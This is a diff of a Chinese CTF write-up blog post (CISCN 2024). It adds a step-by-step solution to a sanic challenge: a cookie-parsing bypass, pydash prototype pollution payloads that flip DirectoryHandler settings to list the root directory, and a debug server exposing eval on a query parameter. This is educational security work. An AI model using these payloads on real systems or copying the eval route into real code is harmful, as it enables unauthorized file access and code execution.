@@ -76,7 +76,7 @@
     <div id="toc" class="toc-article">
     <h3><i class="fas fa-stream"></i>  目录</h3>
       <div class="toc-title"></div>
-      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web"><span class="toc-number">2.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Simple-php"><span class="toc-number">2.1.</span> <span class="toc-text">Simple_php</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easycms"><span class="toc-number">2.2.</span> <span class="toc-text">easycms</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sanic%EF%BC%88%E5%A4%8D%E7%8E%B0%EF%BC%89"><span class="toc-number">2.3.</span> <span class="toc-text">sanic（复现）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sanic%E8%A7%A3%E6%9E%90"><span class="toc-number">2.3.1.</span> <span class="toc-text">sanic解析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pydash%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93"><span class="toc-number">2.3.2.</span> <span class="toc-text">pydash原型链污染</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easycms-revenge"><span class="toc-number">2.4.</span> <span class="toc-text">easycms_revenge</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%AD%A3%E8%A7%A3"><span class="toc-number">2.4.1.</span> <span class="toc-text">正解</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#mossfern-%E5%A4%8D%E7%8E%B0"><span class="toc-number">2.5.</span> <span class="toc-text">mossfern (复现)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ezjava-Unsolved"><span class="toc-number">2.6.</span> <span class="toc-text">ezjava (Unsolved)</span></a></li></ol></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web"><span class="toc-number">2.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Simple-php"><span class="toc-number">2.1.</span> <span class="toc-text">Simple_php</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easycms"><span class="toc-number">2.2.</span> <span class="toc-text">easycms</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sanic%EF%BC%88%E5%A4%8D%E7%8E%B0%EF%BC%89"><span class="toc-number">2.3.</span> <span class="toc-text">sanic（复现）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sanic%E8%A7%A3%E6%9E%90%E7%BB%95%E8%BF%87cookie%E6%A3%80%E6%B5%8B"><span class="toc-number">2.3.1.</span> <span class="toc-text">sanic解析绕过cookie检测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pydash%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93"><span class="toc-number">2.3.2.</span> <span class="toc-text">pydash原型链污染</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B1%A1%E6%9F%93-file"><span class="toc-number">2.3.3.</span> <span class="toc-text">污染__file__</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%BB%E6%89%BE%E6%B1%A1%E6%9F%93%E9%93%BE"><span class="toc-number">2.3.4.</span> <span class="toc-text">寻找污染链</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B1%A1%E6%9F%93directory-view"><span class="toc-number">2.3.4.1.</span> <span class="toc-text">污染directory_view</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B1%A1%E6%9F%93directory"><span class="toc-number">2.3.4.2.</span> <span class="toc-text">污染directory</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%80%E7%BB%88payload"><span class="toc-number">2.3.4.3.</span> <span class="toc-text">最终payload</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B6%E5%AE%83%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E7%9A%84%E6%96%B9%E6%B3%95"><span class="toc-number">2.3.5.</span> <span class="toc-text">其它文件读取的方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">2.3.6.</span> <span class="toc-text">内存马</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easycms-revenge"><span class="toc-number">2.4.</span> <span class="toc-text">easycms_revenge</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%AD%A3%E8%A7%A3"><span class="toc-number">2.4.1.</span> <span class="toc-text">正解</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#mossfern-%E5%A4%8D%E7%8E%B0"><span class="toc-number">2.5.</span> <span class="toc-text">mossfern (复现)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ezjava-Unsolved"><span class="toc-number">2.6.</span> <span class="toc-text">ezjava (Unsolved)</span></a></li></ol></li></ol>
     </div>
   
         
@@ -253,12 +253,12 @@
             
             <span class="tag">
                 
-                <a href="/blog/tags/python/" style="color: #03a9f4">python</a>
+                <a href="/blog/tags/python/" style="color: #00bcd4">python</a>
             </span>
             
             <span class="tag">
                 
-                <a href="/blog/tags/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/" style="color: #03a9f4">沙箱逃逸</a>
+                <a href="/blog/tags/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/" style="color: #00a596">沙箱逃逸</a>
             </span>
             
         </span>
@@ -272,7 +272,7 @@
         <i class="fa fa-keyboard-o"></i>
         <span class="post-meta-item-text">  字数统计: </span>
         <!-- 安装插件npm install hexo-wordcount --save -->
-        <span class="post-count">5.4k字</span>
+        <span class="post-count">6.6k字</span>
       </span>
     </span>
 
@@ -281,7 +281,7 @@
       <span class="post-meta-item-icon">
         <i class="fa fa-hourglass-half"></i>
         <span class="post-meta-item-text">  阅读时长: </span>
-        <span class="post-count">27分</span>
+        <span class="post-count">32分</span>
       </span>
     </span>
     
@@ -301,8 +301,9 @@
 <p>两道python是有大概思路但是不会做的</p>
 <p>jdbc是没学的。。。</p>
 <p>参考：</p>
-<p>Jay17：<a target="_blank" rel="noopener" href="https://blog.csdn.net/Jayjay___/article/details/139047540">https://blog.csdn.net/Jayjay___/article/details/139047540</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Jayjay___/article/details/139047540">https://blog.csdn.net/Jayjay___/article/details/139047540</a></p>
 <p><a target="_blank" rel="noopener" href="https://jbnrz.com.cn/index.php/2024/05/20/ciscn-2024/">https://jbnrz.com.cn/index.php/2024/05/20/ciscn-2024/</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/gxngxngxn/p/18205235">https://www.cnblogs.com/gxngxngxn/p/18205235</a></p>
 <span id="more"></span>
 
 <hr>
@@ -546,7 +547,7 @@ Session<span class="token punctuation">(</span>app<span class="token punctuation
     <span class="token keyword">return</span> text<span class="token punctuation">(</span><span class="token string">"login fail"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>一开始就被卡住了，这个cookie里的user要为<code>adm;n</code>，然而sanic不会自动转换url编码和unicode编码</p>
-<h3 id="sanic解析"><a href="#sanic解析" class="headerlink" title="sanic解析"></a>sanic解析</h3><p>这个时候要去审计sanic的源码</p>
+<h3 id="sanic解析绕过cookie检测"><a href="#sanic解析绕过cookie检测" class="headerlink" title="sanic解析绕过cookie检测"></a>sanic解析绕过cookie检测</h3><p>这个时候要去审计sanic的源码</p>
 <p><img src="/blog/2024/05/18/CISCN2024/image-20240520195415031.png" alt="image-20240520195415031"></p>
 <p>看一下它解析cookie的方法：</p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">parse_cookie</span><span class="token punctuation">(</span>raw<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> Dict<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">,</span> List<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
@@ -619,7 +620,7 @@ _\\<span class="token punctuation">.</span>
 _\<span class="token punctuation">.</span>
 _<span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p>而提到python的原型链污染，想起了之前<a href="https://c1oudfl0w0.github.io/blog/2023/07/25/DASCTF-2023-0X401/#%E9%9D%9E%E9%A2%84%E6%9C%9F-%E6%B1%A1%E6%9F%93-static-folder%E8%8E%B7%E5%8F%96%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F">dasctf &amp; 0X401 EzFlask</a>里面pop神污染静态文件变量的操作</p>
+<h3 id="污染-file"><a href="#污染-file" class="headerlink" title="污染__file__"></a>污染__file__</h3><p>而提到python的原型链污染，想起了之前<a href="https://c1oudfl0w0.github.io/blog/2023/07/25/DASCTF-2023-0X401/#%E9%9D%9E%E9%A2%84%E6%9C%9F-%E6%B1%A1%E6%9F%93-static-folder%E8%8E%B7%E5%8F%96%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F">dasctf &amp; 0X401 EzFlask</a>里面pop神污染静态文件变量的操作</p>
 <p>这里也可以，尝试污染<code>__file__</code></p>
 <p><img src="/blog/2024/05/18/CISCN2024/image-20240520211135998.png" alt="image-20240520211135998"></p>
 <p>payload：</p>
@@ -629,15 +630,188 @@ _<span class="token punctuation">.</span><span aria-hidden="true" class="line-nu
 <p><img src="/blog/2024/05/18/CISCN2024/image-20240520203743979.png" alt="image-20240520203743979"></p>
 <p>ctfshow的复现环境可以直接读<code>/proc/1/environ</code>获取环境变量里的flag</p>
 <p><img src="/blog/2024/05/18/CISCN2024/image-20240520203843029.png" alt="image-20240520203843029"></p>
-<p>至于rce，不知道sanic有没有像参考文章那个类似于jinja编译模板的包可以利用</p>
-<p>正确的做法貌似最终需要列出目录，污染<code>static</code>的<code>DirectoryHandler</code>和<code>directory_view</code>和<code>_parts</code>为<code>True</code>和<code>/</code></p>
+<h3 id="寻找污染链"><a href="#寻找污染链" class="headerlink" title="寻找污染链"></a>寻找污染链</h3><p>正确的做法貌似最终需要列出目录，污染<code>static</code>的<code>DirectoryHandler</code>和<code>directory_view</code>和<code>_parts</code>为<code>True</code>和<code>/</code></p>
 <p>即目标是<code>app.static(&quot;/static/&quot;, &quot;./static/&quot;)</code></p>
 <p><img src="/blog/2024/05/18/CISCN2024/image-20240520205253702.png" alt="image-20240520205253702"></p>
 <pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"key"</span><span class="token operator">:</span><span class="token string">"__init__\\\\.__globals__\\\\.app.signal_router._future_statics.1857365850384.11"</span><span class="token punctuation">,</span><span class="token property">"value"</span><span class="token operator">:</span><span class="token string">"True"</span><span class="token punctuation">&#125;</span>
 <span class="token punctuation">&#123;</span><span class="token property">"key"</span><span class="token operator">:</span><span class="token string">"__init__\\\\.__globals__\\\\.app.signal_router._future_statics.1857365850384.10"</span><span class="token punctuation">,</span><span class="token property">"value"</span><span class="token operator">:</span><span class="token string">"True"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
-<p>但是参数太多了，调试看不过来。。</p>
-<p>于是不会写payload</p>
+<p>但是参数太多了，调试根本看不过来，上面那串数字估计是随机的。。。</p>
+<p>还是得回到sanic的源码，f12直接跟进</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">static</span><span class="token punctuation">(</span>
+    self<span class="token punctuation">,</span>
+    uri<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">,</span>
+    file_or_directory<span class="token punctuation">:</span> Union<span class="token punctuation">[</span>PathLike<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
+    pattern<span class="token punctuation">:</span> <span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">r"/?.+"</span><span class="token punctuation">,</span>
+    use_modified_since<span class="token punctuation">:</span> <span class="token builtin">bool</span> <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">,</span>
+    use_content_range<span class="token punctuation">:</span> <span class="token builtin">bool</span> <span class="token operator">=</span> <span class="token boolean">False</span><span class="token punctuation">,</span>
+    stream_large_files<span class="token punctuation">:</span> Union<span class="token punctuation">[</span><span class="token builtin">bool</span><span class="token punctuation">,</span> <span class="token builtin">int</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">False</span><span class="token punctuation">,</span>
+    name<span class="token punctuation">:</span> <span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">"static"</span><span class="token punctuation">,</span>
+    host<span class="token punctuation">:</span> Optional<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">None</span><span class="token punctuation">,</span>
+    strict_slashes<span class="token punctuation">:</span> Optional<span class="token punctuation">[</span><span class="token builtin">bool</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">None</span><span class="token punctuation">,</span>
+    content_type<span class="token punctuation">:</span> Optional<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">None</span><span class="token punctuation">,</span>
+    <span class="token builtin">apply</span><span class="token punctuation">:</span> <span class="token builtin">bool</span> <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">,</span>
+    resource_type<span class="token punctuation">:</span> Optional<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">None</span><span class="token punctuation">,</span>
+    index<span class="token punctuation">:</span> Optional<span class="token punctuation">[</span>Union<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">,</span> Sequence<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">None</span><span class="token punctuation">,</span>
+    directory_view<span class="token punctuation">:</span> <span class="token builtin">bool</span> <span class="token operator">=</span> <span class="token boolean">False</span><span class="token punctuation">,</span>
+    directory_handler<span class="token punctuation">:</span> Optional<span class="token punctuation">[</span>DirectoryHandler<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">None</span><span class="token punctuation">,</span>
+<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>参数有这些，在底下对参数的注释中看到</p>
+<p><img src="/blog/2024/05/18/CISCN2024/image-20240523000326648.png" alt="image-20240523000326648"></p>
+<p><code>directory_view</code>为True时，会开启列目录功能；而<code>directory_handler</code>中可以获取指定的目录</p>
+<p>跟进<code>directory_handler</code></p>
+<p><img src="/blog/2024/05/18/CISCN2024/image-20240523000516400.png" alt="image-20240523000516400"></p>
+<p>发现调用了<code>DirectoryHandler</code>类，继续跟进</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">DirectoryHandler</span><span class="token punctuation">:</span>
+    <span class="token triple-quoted-string string">"""Serve files from a directory.
+
+    Args:
+        uri (str): The URI to serve the files at.
+        directory (Path): The directory to serve files from.
+        directory_view (bool): Whether to show a directory listing or not.
+        index (Optional[Union[str, Sequence[str]]]): The index file(s) to
+            serve if the directory is requested. Defaults to None.
+    """</span>
+
+    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>
+        self<span class="token punctuation">,</span>
+        uri<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">,</span>
+        directory<span class="token punctuation">:</span> Path<span class="token punctuation">,</span>
+        directory_view<span class="token punctuation">:</span> <span class="token builtin">bool</span> <span class="token operator">=</span> <span class="token boolean">False</span><span class="token punctuation">,</span>
+        index<span class="token punctuation">:</span> Optional<span class="token punctuation">[</span>Union<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">,</span> Sequence<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">None</span><span class="token punctuation">,</span>
+    <span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token boolean">None</span><span class="token punctuation">:</span>
+        <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+            index <span class="token operator">=</span> <span class="token punctuation">[</span>index<span class="token punctuation">]</span>
+        <span class="token keyword">elif</span> index <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
+            index <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
+        self<span class="token punctuation">.</span>base <span class="token operator">=</span> uri<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span>
+        self<span class="token punctuation">.</span>directory <span class="token operator">=</span> directory
+        self<span class="token punctuation">.</span>directory_view <span class="token operator">=</span> directory_view
+        self<span class="token punctuation">.</span>index <span class="token operator">=</span> <span class="token builtin">tuple</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span>
+        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>那么只要让参数<code>directory</code>为<code>/</code>，<code>directory_view</code>为True，就可以看到根目录的所有文件了</p>
+<p>现在我们开始本地调试，为了方便，把前面session判断的那些源码全部注释掉，再加入一个eval方便打印信息</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> sanic <span class="token keyword">import</span> Sanic
+<span class="token keyword">from</span> sanic<span class="token punctuation">.</span>response <span class="token keyword">import</span> text<span class="token punctuation">,</span> html
+<span class="token comment">#from sanic_session import Session</span>
+<span class="token keyword">import</span> sys
+<span class="token keyword">import</span> pydash
+<span class="token comment"># pydash==5.1.2</span>
+
+
+<span class="token keyword">class</span> <span class="token class-name">Pollute</span><span class="token punctuation">:</span>
+    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">pass</span>
+
+
+app <span class="token operator">=</span> Sanic<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
+app<span class="token punctuation">.</span>static<span class="token punctuation">(</span><span class="token string">"/static/"</span><span class="token punctuation">,</span> <span class="token string">"./static/"</span><span class="token punctuation">)</span>
+<span class="token comment">#Session(app)</span>
+
+
+<span class="token comment">#@app.route('/', methods=['GET', 'POST'])</span>
+<span class="token comment">#async def index(request):</span>
+    <span class="token comment">#return html(open('static/index.html').read())</span>
+
+
+<span class="token comment">#@app.route("/login")</span>
+<span class="token comment">#async def login(request):</span>
+    <span class="token comment">#user = request.cookies.get("user")</span>
+    <span class="token comment">#if user.lower() == 'adm;n':</span>
+        <span class="token comment">#request.ctx.session['admin'] = True</span>
+        <span class="token comment">#return text("login success")</span>
+
+    <span class="token comment">#return text("login fail")</span>
+
+
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/src"</span><span class="token punctuation">)</span>
+<span class="token keyword">async</span> <span class="token keyword">def</span> <span class="token function">src</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token builtin">eval</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    <span class="token keyword">return</span> text<span class="token punctuation">(</span><span class="token builtin">open</span><span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/admin"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+<span class="token keyword">async</span> <span class="token keyword">def</span> <span class="token function">admin</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    key <span class="token operator">=</span> request<span class="token punctuation">.</span>json<span class="token punctuation">[</span><span class="token string">'key'</span><span class="token punctuation">]</span>
+    value <span class="token operator">=</span> request<span class="token punctuation">.</span>json<span class="token punctuation">[</span><span class="token string">'value'</span><span class="token punctuation">]</span>
+    <span class="token keyword">if</span> key <span class="token keyword">and</span> value <span class="token keyword">and</span> <span class="token builtin">type</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span> <span class="token keyword">is</span> <span class="token builtin">str</span> <span class="token keyword">and</span> <span class="token string">'_.'</span> <span class="token keyword">not</span> <span class="token keyword">in</span> key<span class="token punctuation">:</span>
+        pollute <span class="token operator">=</span> Pollute<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        pydash<span class="token punctuation">.</span>set_<span class="token punctuation">(</span>pollute<span class="token punctuation">,</span> key<span class="token punctuation">,</span> value<span class="token punctuation">)</span>
+        <span class="token keyword">return</span> text<span class="token punctuation">(</span><span class="token string">"success"</span><span class="token punctuation">)</span>
+    <span class="token keyword">else</span><span class="token punctuation">:</span>
+        <span class="token keyword">return</span> text<span class="token punctuation">(</span><span class="token string">"forbidden"</span><span class="token punctuation">)</span>
+
+<span class="token comment">#print(app.router.name_index['name'].directory_view)</span>
+
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
+    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>调试的时候发现有<code>app.router.name_index</code>可以获取注册的路由，因为之前没找到<code>app.static</code>变量于是猜测得从注册路由这里下手</p>
+<p><img src="/blog/2024/05/18/CISCN2024/image-20240523002319518.png" alt="image-20240523002319518"></p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">/</span>src?a<span class="token operator">=</span><span class="token keyword">print</span><span class="token punctuation">(</span>app<span class="token punctuation">.</span>router<span class="token punctuation">.</span>name_index<span class="token punctuation">)</span>
+
+<span class="token comment">#&#123;'__mp_main__.static': &lt;Route: name=__mp_main__.static path=static/&lt;__file_uri__:path>>, '__mp_main__.src': &lt;Route: name=__mp_main__.src path=src>, '__mp_main__.admin': &lt;Route: name=__mp_main__.admin path=admin>&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>那么访问对应的键值就能访问到其路由，接下来想办法进到<code>DirectoryHandler</code></p>
+<p>在sanic的几个库里面全局搜一下<code>name_index</code>方法</p>
+<p><img src="/blog/2024/05/18/CISCN2024/image-20240523004218935.png" alt="image-20240523004218935"></p>
+<p>找到系统默认的调用点，然后下断点调试（vscode调试第三方库参考<a target="_blank" rel="noopener" href="https://blog.csdn.net/zlb872551601/article/details/105354738">https://blog.csdn.net/zlb872551601/article/details/105354738</a>）</p>
+<p><img src="/blog/2024/05/18/CISCN2024/image-20240523010018167.png" alt="image-20240523010018167"></p>
+<p>从handler入手，可以发现<code>directory_handler</code>中的<code>directory</code>和<code>directory_view</code>变量</p>
+<p>这里的name要多跟进几次得到<code>__mp_main__.static</code>（或许是因为此时sanic服务才正式启动？，又或者这个才是最后覆盖static变量的name？）</p>
+<p>于是连上我们前面的链子：（奇怪的是）</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">app<span class="token punctuation">.</span>router<span class="token punctuation">.</span>name_index<span class="token punctuation">[</span><span class="token string">'__mp_main__.static'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>handler<span class="token punctuation">.</span>keywords<span class="token punctuation">[</span><span class="token string">'directory_handler'</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/blog/2024/05/18/CISCN2024/image-20240523010432983.png" alt="image-20240523010432983"></p>
+<p>这样就能获取<code>directory</code>和<code>directory_view</code>的值了</p>
+<p><img src="/blog/2024/05/18/CISCN2024/image-20240523010611341.png" alt="image-20240523010611341"></p>
+<p>于是就能进行污染了</p>
+<h4 id="污染directory-view"><a href="#污染directory-view" class="headerlink" title="污染directory_view"></a>污染directory_view</h4><p>payload：</p>
+<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"key"</span><span class="token operator">:</span><span class="token string">"__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.directory_view"</span><span class="token punctuation">,</span><span class="token property">"value"</span><span class="token operator">:</span><span class="token string">"True"</span> <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>注意这里不能用<code>[]</code>来包裹其中的索引，污染和直接调用不同，我们需要用<code>.</code>来连接；而<code>__mp_main__</code>是一个整体，不能分开，用两个反斜杠转义即可</p>
+<p>改为True后就可以访问到<code>/static/</code>下的文件了</p>
+<p><img src="/blog/2024/05/18/CISCN2024/image-20240523011600831.png" alt="image-20240523011600831"></p>
+<h4 id="污染directory"><a href="#污染directory" class="headerlink" title="污染directory"></a>污染directory</h4><p>接下来污染<code>directory</code></p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token string">"key"</span><span class="token punctuation">:</span><span class="token string">"__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.directory"</span><span class="token punctuation">,</span><span class="token string">"value"</span><span class="token punctuation">:</span><span class="token string">"d:"</span> <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>再次访问返回500，报错</p>
+<p><img src="/blog/2024/05/18/CISCN2024/image-20240523011908163.png" alt="image-20240523011908163"></p>
+<p>很明显不能直接将这里的值污染为一个字符串类型</p>
+<p>我们回到前面调试sanic库的部分</p>
+<p><img src="/blog/2024/05/18/CISCN2024/image-20240523012203237.png" alt="image-20240523012203237"></p>
+<p>这里的directory是一个对象，而值则由其中的<strong>parts</strong>属性决定，但是这个属性是一个tuple，不能直接污染，回到前面的DirectoryHandler类的源码寻找办法</p>
+<p><img src="/blog/2024/05/18/CISCN2024/image-20240523012449560.png" alt="image-20240523012449560"></p>
+<p>这里的directory参数是一个Path对象，跟进Path类</p>
+<p><img src="/blog/2024/05/18/CISCN2024/image-20240523012633968.png" alt="image-20240523012633968"></p>
+<p>继续跟进<code>_from_parts</code>方法</p>
+<p><img src="/blog/2024/05/18/CISCN2024/image-20240523012705002.png" alt="image-20240523012705002"></p>
+<p>可以看到<code>parts</code>的值最后是给了<code>_parts</code>这个属性</p>
+<p><img src="/blog/2024/05/18/CISCN2024/image-20240523012810707.png" alt="image-20240523012810707"></p>
+<p>这是一个list，那么这里很明显我们就可以直接污染了，payload：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token string">"key"</span><span class="token punctuation">:</span><span class="token string">"__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.directory._parts"</span><span class="token punctuation">,</span><span class="token string">"value"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">"d:"</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/blog/2024/05/18/CISCN2024/image-20240523013602083.png" alt="image-20240523013602083"></p>
